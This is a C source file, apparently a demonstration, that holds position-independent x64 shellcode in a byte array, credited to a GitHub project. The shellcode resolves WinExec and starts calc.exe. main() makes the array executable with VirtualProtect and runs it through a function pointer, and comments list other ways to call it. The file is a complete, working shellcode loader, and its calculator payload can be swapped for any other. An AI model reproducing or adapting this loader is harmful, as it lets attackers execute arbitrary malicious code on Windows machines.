#include <assert.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

static_assert(sizeof(unsigned char) == 1, "Expecting 8 bits unsigned char");

//  To avoid exception after calc.exe execution
//  shellcode works without this
#define SUFFIX , 0x59, 0x59, 0x59, 0x59, 0x59, 0x59, 0x59, 0xC3

//  https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode

UCHAR payload[] = {
    0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58,       0x60, 0x48, 0x8B, 0x5B, 0x18,
    0x48, 0x8B, 0x5B, 0x20, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x1B,       0x48, 0x8B, 0x5B, 0x20, 0x49,
    0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31,       0xC9, 0x66, 0x81, 0xC1, 0xFF,
    0x88, 0x48, 0xC1, 0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01,       0xC2, 0x4D, 0x31, 0xD2, 0x44,
    0x8B, 0x52, 0x1C, 0x4D, 0x01, 0xC2, 0x4D, 0x31, 0xDB, 0x44,       0x8B, 0x5A, 0x20, 0x4D, 0x01,
    0xC3, 0x4D, 0x31, 0xE4, 0x44, 0x8B, 0x62, 0x24, 0x4D, 0x01,       0xC4, 0xEB, 0x32, 0x5B, 0x59,
    0x48, 0x31, 0xC0, 0x48, 0x89, 0xE2, 0x51, 0x48, 0x8B, 0x0C,       0x24, 0x48, 0x31, 0xFF, 0x41,
    0x8B, 0x3C, 0x83, 0x4C, 0x01, 0xC7, 0x48, 0x89, 0xD6, 0xF3,       0xA6, 0x74, 0x05, 0x48, 0xFF,
    0xC0, 0xEB, 0xE6, 0x59, 0x66, 0x41, 0x8B, 0x04, 0x44, 0x41,       0x8B, 0x04, 0x82, 0x4C, 0x01,
    0xC0, 0x53, 0xC3, 0x48, 0x31, 0xC9, 0x80, 0xC1, 0x07, 0x48,       0xB8, 0x0F, 0xA8, 0x96, 0x91,
    0xBA, 0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8,       0x08, 0x50, 0x51, 0xE8, 0xB0,
    0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xC6, 0x48, 0x31, 0xC9, 0x48,       0xF7, 0xE1, 0x50, 0x48, 0xB8,
    0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7,       0xD0, 0x50, 0x48, 0x89, 0xE1,
    0x48, 0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xFF, 0xD6 SUFFIX};

void debugInfo() {
  DWORD errorCode = GetLastError();

  LPWSTR errorMsgBuffer = NULL;
  FormatMessage(
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
      NULL,
      errorCode,
      0,
      (LPWSTR)&errorMsgBuffer,
      0,
      NULL);
  wprintf(L"VirtualProtect failed with error code %i: %s\n", errorCode, errorMsgBuffer);
  LocalFree(errorMsgBuffer);
}

#define FAIL 0

int main() {
  //  As far as I know in older windows version like win7 you can
  //  execute directly the shellcode without the needs of change memory permissions
  //  It requires that oldProtect points to valid memory so nullptr or 0 doesn't work.
  DWORD oldProtect = 0;
  if (VirtualProtect((LPVOID)payload, sizeof(payload), PAGE_EXECUTE_READWRITE, &oldProtect) ==
      FAIL) {
    debugInfo();
    return EXIT_FAILURE;
  }

  //  one line, cast and execution
  ((void (*)())payload)();

  //  typedef void(*functionPtr)(); // function pointer declaration
  //  functionPtr shellcodeFunction = (void (*)())code; // shellcode cast to function pointer

  //  Alternative
  //  void (*shellcodeFunction)();          // function pointer declaration
  //  shellcodeFunction = (void (*)())code; // shellcode cast to function pointer

  //  pointer declaration and initialization
  //  void (*shellcodeFunction)() = (void (*)())code;

  //  (void)(*shellcodeFunction)();       // shellcode execution
  //  shellcodeFunction();                // another way to execute the shellcode
  //  (*shellcodeFunction)();             // another way to execute the shellcode

  return EXIT_SUCCESS;
}
